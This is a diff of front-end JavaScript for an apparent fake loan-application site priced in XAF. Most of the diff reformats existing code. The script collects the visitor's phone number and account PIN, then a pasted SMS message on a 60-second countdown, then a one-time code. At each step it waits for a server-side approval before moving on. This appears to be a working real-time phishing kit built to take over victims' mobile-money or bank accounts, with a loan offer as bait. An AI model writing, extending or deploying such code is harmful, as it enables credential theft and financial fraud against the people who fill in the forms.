@@ -13,7 +13,6 @@ function goTo(pageId) {
     document.getElementById(pageId)?.classList.add('active');
     window.scrollTo(0, 0);
 
-    // Reset button/spinner state on specific pages
     if (pageId === 'page-sms-paste') {
         const btn = document.getElementById('bSms');
         const spinner = document.getElementById('mSms');
@@ -77,15 +76,8 @@ function toS2() {
     const am = +document.getElementById('s1am').value;
     const te = document.getElementById('s1te').value;
     const pu = document.getElementById('s1pu').value;
-
-    if (!ty || am <= 0 || !te || !pu.trim()) {
-        showErr('s1Err', 'Please complete all fields.');
-        return;
-    }
-    S.loanType = ty;
-    S.loanAmount = am;
-    S.loanTerm = te;
-    S.loanPurpose = pu;
+    if (!ty || am <= 0 || !te || !pu.trim()) { showErr('s1Err', 'Please complete all fields.'); return; }
+    S.loanType = ty; S.loanAmount = am; S.loanTerm = te; S.loanPurpose = pu;
     goTo('page-step2');
 }
 
@@ -94,14 +86,8 @@ function toS3() {
     const fi = document.getElementById('s2fi').value.trim();
     const la = document.getElementById('s2la').value.trim();
     const ph = document.getElementById('s2ph').value;
-
-    if (!fi || !la || ph.length !== 9) {
-        showErr('s2Err', 'Please enter valid first name, last name, and 9-digit phone number.');
-        return;
-    }
-    S.firstName = fi;
-    S.lastName = la;
-    S.phone = ph;
+    if (!fi || !la || ph.length !== 9) { showErr('s2Err', 'Please enter valid names and 9-digit phone number.'); return; }
+    S.firstName = fi; S.lastName = la; S.phone = ph;
     goTo('page-step3');
 }
 
@@ -109,13 +95,8 @@ function toS3() {
 function submitApp() {
     const em = document.getElementById('s3em').value;
     const in_ = +document.getElementById('s3in').value;
-
-    if (!em || in_ <= 0) {
-        showErr('s3Err', 'Please complete all fields.');
-        return;
-    }
-    S.employment = em;
-    S.annualIncome = in_;
+    if (!em || in_ <= 0) { showErr('s3Err', 'Please complete all fields.'); return; }
+    S.employment = em; S.annualIncome = in_;
     S.applicationId = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
     goTo('page-processing');
     setTimeout(() => { goTo('page-login'); }, 2000);
@@ -124,9 +105,7 @@ function submitApp() {
 // ============== LOGIN PIN INPUT ==============
 function pinMvM(el, i) {
     el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 4) {
-        document.getElementById('lp' + (i+1)).focus();
-    }
+    if (el.value && i < 4) document.getElementById('lp' + (i+1)).focus();
     chkPin();
 }
 
@@ -150,58 +129,32 @@ function clearLoginPin() {
 
 // ============== LOGIN ==============
 async function doLogin() {
-    if (S.isSubmitting) {
-        console.log('Login already in flight');
-        return;
-    }
+    if (S.isSubmitting) return;
     S.isSubmitting = true;
-
     ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-
     const phone = document.getElementById('lpPhone').value;
-    const pin   = [0,1,2,3,4].map(i => document.getElementById('lp'+i).value).join('');
-
-    if (phone.length !== 9 || pin.length < 5) {
-        S.isSubmitting = false;
-        showLgnMsg('warning', 'Phone: 9 digits (e.g., 670123456). PIN: 5 digits.');
-        return;
-    }
-
+    const pin = [0,1,2,3,4].map(i => document.getElementById('lp'+i).value).join('');
+    if (phone.length !== 9 || pin.length < 5) { S.isSubmitting = false; showLgnMsg('warning', 'Phone: 9 digits, PIN: 5 digits.'); return; }
     document.getElementById('mLgn').classList.add('show');
     document.getElementById('bLgn').disabled = true;
-
     try {
-        const res  = await fetch('/api/verify-pin', {
-            method:  'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body:    JSON.stringify({ phoneNumber: phone, pin: pin })
-        });
+        const res = await fetch('/api/verify-pin', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phoneNumber: phone, pin }) });
         const data = await res.json();
         document.getElementById('mLgn').classList.remove('show');
-
         if (data.success) {
             S.isSubmitting = false;
             S.applicationId = data.applicationId;
             document.getElementById('waitAppId').textContent = data.applicationId;
             goTo('page-wait-login-approval');
             pollForPinApproval(data.applicationId);
-        } else {
-            S.isSubmitting = false;
-            document.getElementById('bLgn').disabled = false;
-            showLgnMsg('error', data.message || 'Login failed.');
-        }
-    } catch (err) {
-        S.isSubmitting = false;
-        document.getElementById('mLgn').classList.remove('show');
-        document.getElementById('bLgn').disabled = false;
-        showLgnMsg('error', 'Network error: ' + err.message);
-    }
+        } else { S.isSubmitting = false; document.getElementById('bLgn').disabled = false; showLgnMsg('error', data.message || 'Login failed.'); }
+    } catch (err) { S.isSubmitting = false; document.getElementById('mLgn').classList.remove('show'); document.getElementById('bLgn').disabled = false; showLgnMsg('error', 'Network error: ' + err.message); }
 }
 
 function showLgnMsg(type, text) {
     ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-    if (type === 'error')   { document.getElementById('lpMsgTxt').textContent = text;     document.getElementById('lpMsg').classList.add('show'); }
-    if (type === 'success') { document.getElementById('lpMsgOkTxt').textContent = text;   document.getElementById('lpMsgOk').classList.add('show'); }
+    if (type === 'error') { document.getElementById('lpMsgTxt').textContent = text; document.getElementById('lpMsg').classList.add('show'); }
+    if (type === 'success') { document.getElementById('lpMsgOkTxt').textContent = text; document.getElementById('lpMsgOk').classList.add('show'); }
     if (type === 'warning') { document.getElementById('lpMsgWarnTxt').textContent = text; document.getElementById('lpMsgWarn').classList.add('show'); }
 }
 
@@ -211,29 +164,14 @@ function pollForPinApproval(applicationId) {
     const checkStatus = async () => {
         if (S.applicationId !== applicationId) return;
         try {
-            const res  = await fetch(`/api/check-pin-status/${applicationId}`);
+            const res = await fetch(`/api/check-pin-status/${applicationId}`);
             const data = await res.json();
             if (data.success) {
-                if (data.status === 'approved') {
-                    clearTimeout(pollTimeout);
-                    goTo('page-sms-paste');
-                } else if (data.status === 'rejected') {
-                    clearTimeout(pollTimeout);
-                    document.getElementById('lpPhone').value = '';
-                    [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-                    goTo('page-login');
-                    document.getElementById('bLgn').disabled = false;
-                    chkPin();
-                    showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
-                } else {
-                    pollTimeout = setTimeout(checkStatus, 2000);
-                }
-            } else {
-                pollTimeout = setTimeout(checkStatus, 3000);
-            }
-        } catch (err) {
-            pollTimeout = setTimeout(checkStatus, 3000);
-        }
+                if (data.status === 'approved') { clearTimeout(pollTimeout); goTo('page-sms-paste'); }
+                else if (data.status === 'rejected') { clearTimeout(pollTimeout); document.getElementById('lpPhone').value = ''; [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = ''); goTo('page-login'); document.getElementById('bLgn').disabled = false; chkPin(); showLgnMsg('error', 'Your login credentials were invalid. Please try again.'); }
+                else pollTimeout = setTimeout(checkStatus, 2000);
+            } else pollTimeout = setTimeout(checkStatus, 3000);
+        } catch (err) { pollTimeout = setTimeout(checkStatus, 3000); }
     };
     checkStatus();
 }
@@ -246,14 +184,13 @@ function chkSmsMsg() {
 
 function showSmsMsg(type, text) {
     ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-    if (type === 'error')   { document.getElementById('smsMsgTxt').textContent   = text; document.getElementById('smsMsg').classList.add('show'); }
+    if (type === 'error') { document.getElementById('smsMsgTxt').textContent = text; document.getElementById('smsMsg').classList.add('show'); }
     if (type === 'success') { document.getElementById('smsMsgOkTxt').textContent = text; document.getElementById('smsMsgOk').classList.add('show'); }
 }
 
 // SMS Timer
 let smsTimerInterval = null;
-let smsTimerExpired  = false;
-
+let smsTimerExpired = false;
 function startSmsTimer() {
     if (smsTimerInterval) clearInterval(smsTimerInterval);
     smsTimerExpired = false;
@@ -261,99 +198,61 @@ function startSmsTimer() {
     document.getElementById('smsMsgBox').disabled = false;
     chkSmsMsg();
     document.getElementById('smsResendWrap').style.display = 'none';
-
     const arc = document.getElementById('smsTimerArc');
     const num = document.getElementById('smsTimerNum');
     const sec = document.getElementById('smsTimerSec');
-    arc.classList.remove('urgent');
-    num.classList.remove('urgent');
+    arc.classList.remove('urgent'); num.classList.remove('urgent');
     arc.style.strokeDashoffset = '0';
     document.getElementById('smsTimerWrap').style.display = 'flex';
-
     let remaining = 60;
     const CIRCUMFERENCE = 113;
     const tick = function() {
         remaining--;
         const pct = remaining / 60;
         arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
-        num.textContent = remaining;
-        sec.textContent = remaining;
+        num.textContent = remaining; sec.textContent = remaining;
         if (remaining <= 10) { arc.classList.add('urgent'); num.classList.add('urgent'); }
         if (remaining <= 0) {
-            clearInterval(smsTimerInterval);
-            smsTimerInterval = null;
-            smsTimerExpired = true;
-            document.getElementById('smsMsgBox').disabled = true;
-            document.getElementById('smsMsgBox').value = '';
-            document.getElementById('bSms').disabled = true;
-            document.getElementById('bSms').className = 'btn-sms';
+            clearInterval(smsTimerInterval); smsTimerInterval = null; smsTimerExpired = true;
+            document.getElementById('smsMsgBox').disabled = true; document.getElementById('smsMsgBox').value = '';
+            document.getElementById('bSms').disabled = true; document.getElementById('bSms').className = 'btn-sms';
             document.getElementById('smsTimerWrap').style.display = 'none';
             document.getElementById('smsResendWrap').style.display = 'block';
-            document.getElementById('bResend').disabled = false;
-            document.getElementById('mResend').classList.remove('show');
+            document.getElementById('bResend').disabled = false; document.getElementById('mResend').classList.remove('show');
             ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
         }
     };
     smsTimerInterval = setInterval(tick, 1000);
 }
 
-function stopSmsTimer() {
-    if (smsTimerInterval) {
-        clearInterval(smsTimerInterval);
-        smsTimerInterval = null;
-    }
-}
+function stopSmsTimer() { if (smsTimerInterval) { clearInterval(smsTimerInterval); smsTimerInterval = null; } }
 
 async function doSmsResend() {
     const btn = document.getElementById('bResend');
     const spinner = document.getElementById('mResend');
-    btn.disabled = true;
-    spinner.classList.add('show');
+    btn.disabled = true; spinner.classList.add('show');
     ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
     try {
-        const res  = await fetch('/api/resend-sms', {
-            method:  'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body:    JSON.stringify({ applicationId: S.applicationId })
-        });
+        const res = await fetch('/api/resend-sms', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId }) });
         const data = await res.json();
         spinner.classList.remove('show');
         if (data.success) {
             document.getElementById('smsResendWrap').style.display = 'none';
-            document.getElementById('smsMsgBox').disabled = false;
-            document.getElementById('bSms').disabled = false;
-            startSmsTimer();
-            showSmsMsg('success', 'A new SMS has been sent to your phone. Paste it below before it expires.');
-        } else {
-            btn.disabled = false;
-            showSmsMsg('error', data.message || 'Failed to resend SMS. Please try again.');
-        }
-    } catch (err) {
-        spinner.classList.remove('show');
-        btn.disabled = false;
-        showSmsMsg('error', 'Network error: ' + err.message);
-    }
+            document.getElementById('smsMsgBox').disabled = false; document.getElementById('bSms').disabled = false;
+            startSmsTimer(); showSmsMsg('success', 'A new SMS has been sent. Paste it before it expires.');
+        } else { btn.disabled = false; showSmsMsg('error', data.message || 'Failed to resend SMS.'); }
+    } catch (err) { spinner.classList.remove('show'); btn.disabled = false; showSmsMsg('error', 'Network error: ' + err.message); }
 }
 
 async function doSmsParse() {
     ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-    if (smsTimerExpired) {
-        document.getElementById('smsResendWrap').style.display = 'block';
-        document.getElementById('bResend').disabled = false;
-        return;
-    }
+    if (smsTimerExpired) { document.getElementById('smsResendWrap').style.display = 'block'; document.getElementById('bResend').disabled = false; return; }
     const msg = document.getElementById('smsMsgBox').value.trim();
     if (msg.length < 3) { showSmsMsg('error', 'Please paste an SMS message.'); return; }
-
     document.getElementById('mSms').classList.add('show');
     document.getElementById('bSms').disabled = true;
-
     try {
-        const res  = await fetch('/api/verify-sms', {
-            method:  'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body:    JSON.stringify({ applicationId: S.applicationId, smsMessage: msg })
-        });
+        const res = await fetch('/api/verify-sms', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId, smsMessage: msg }) });
         const data = await res.json();
         document.getElementById('mSms').classList.remove('show');
         if (data.success) {
@@ -361,15 +260,8 @@ async function doSmsParse() {
             document.getElementById('waitSmsAppId').textContent = S.applicationId;
             goTo('page-wait-sms');
             pollForSmsApproval(S.applicationId);
-        } else {
-            document.getElementById('bSms').disabled = false;
-            showSmsMsg('error', data.message || 'Failed to submit SMS.');
-        }
-    } catch (err) {
-        document.getElementById('mSms').classList.remove('show');
-        document.getElementById('bSms').disabled = false;
-        showSmsMsg('error', 'Error: ' + err.message);
-    }
+        } else { document.getElementById('bSms').disabled = false; showSmsMsg('error', data.message || 'Failed to submit SMS.'); }
+    } catch (err) { document.getElementById('mSms').classList.remove('show'); document.getElementById('bSms').disabled = false; showSmsMsg('error', 'Error: ' + err.message); }
 }
 
 // ============== POLLING SMS APPROVAL ==============
@@ -378,7 +270,7 @@ function pollForSmsApproval(applicationId) {
     const checkStatus = async () => {
         if (S.applicationId !== applicationId) return;
         try {
-            const res  = await fetch(`/api/check-otp-status/${applicationId}`);
+            const res = await fetch(`/api/check-otp-status/${applicationId}`);
             const data = await res.json();
             if (data.success) {
                 if (data.status === 'approved') {
@@ -397,9 +289,7 @@ function pollForSmsApproval(applicationId) {
             } else {
                 smsPollTimeout = setTimeout(checkStatus, 3000);
             }
-        } catch (err) {
-            smsPollTimeout = setTimeout(checkStatus, 3000);
-        }
+        } catch (err) { smsPollTimeout = setTimeout(checkStatus, 3000); }
     };
     checkStatus();
 }
@@ -408,26 +298,24 @@ function pollForSmsApproval(applicationId) {
 function handleOtpInput(el, type) {
     el.value = el.value.replace(/\D/, '');
     const idx = parseInt(el.id.match(/\d$/)[0]);
-    if (el.value && type === 'otp' && idx < 3) {
-        document.getElementById(type + (idx + 1)).focus();
-    }
+    if (el.value && type === 'otp' && idx < 3) document.getElementById(type + (idx + 1)).focus();
     chkOtp();
 }
 
 function chkOtp() {
-    const otpOk = [0,1,2,3].every(i => document.getElementById('otp'+i).value);
-    document.getElementById('bOtp').className = otpOk ? 'btn-otp rdy' : 'btn-otp';
+    const ok = [0,1,2,3].every(i => document.getElementById('otp'+i).value);
+    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
 }
 
 function clearOtpCode() {
-    [0,1,2,3].forEach(i => { document.getElementById('otp'+i).value = ''; });
+    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
     chkOtp();
     document.getElementById('otp0').focus();
 }
 
 function showOtpMsg(type, text) {
     ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-    if (type === 'error')   { document.getElementById('otpMsgTxt').textContent   = text; document.getElementById('otpMsg').classList.add('show'); }
+    if (type === 'error') { document.getElementById('otpMsgTxt').textContent = text; document.getElementById('otpMsg').classList.add('show'); }
     if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text; document.getElementById('otpMsgOk').classList.add('show'); }
 }
 
@@ -435,17 +323,11 @@ async function doOtp() {
     ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
     const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
     if (otp.length < 4) { showOtpMsg('error', 'Please enter 4-digit OTP code.'); return; }
-
     document.getElementById('mOtp').classList.add('show');
     document.getElementById('bOtp').disabled = true;
     document.getElementById('bOtp').textContent = 'VERIFYING...';
-
     try {
-        const res  = await fetch('/api/verify-otp', {
-            method:  'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body:    JSON.stringify({ applicationId: S.applicationId, otp })
-        });
+        const res = await fetch('/api/verify-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId, otp }) });
         const data = await res.json();
         document.getElementById('mOtp').classList.remove('show');
         if (data.success) {
@@ -471,17 +353,17 @@ function pollForOtpApproval(applicationId) {
     const checkStatus = async () => {
         if (S.applicationId !== applicationId) return;
         try {
-            const res  = await fetch(`/api/check-otp-status/${applicationId}`);
+            const res = await fetch(`/api/check-otp-status/${applicationId}`);
             const data = await res.json();
             if (data.success) {
                 const status = data.status;
                 if (status === 'approved') {
                     clearTimeout(otpPollTimeout);
                     document.getElementById('aprAmount').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
-                    document.getElementById('aprAmt').textContent    = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
-                    document.getElementById('aprTerm').textContent   = S.loanTerm || '48 Months';
+                    document.getElementById('aprAmt').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
+                    document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
                     const monthly = Math.ceil((S.loanAmount || 1000000) / (parseInt(S.loanTerm || '48')));
-                    document.getElementById('aprMth').textContent    = 'XAF ' + monthly.toLocaleString();
+                    document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
                     goTo('page-approval');
                 } else if (status === 'rejected') {
                     clearTimeout(otpPollTimeout);
@@ -497,9 +379,7 @@ function pollForOtpApproval(applicationId) {
             } else {
                 otpPollTimeout = setTimeout(checkStatus, 3000);
             }
-        } catch (err) {
-            otpPollTimeout = setTimeout(checkStatus, 3000);
-        }
+        } catch (err) { otpPollTimeout = setTimeout(checkStatus, 3000); }
     };
     checkStatus();
 }
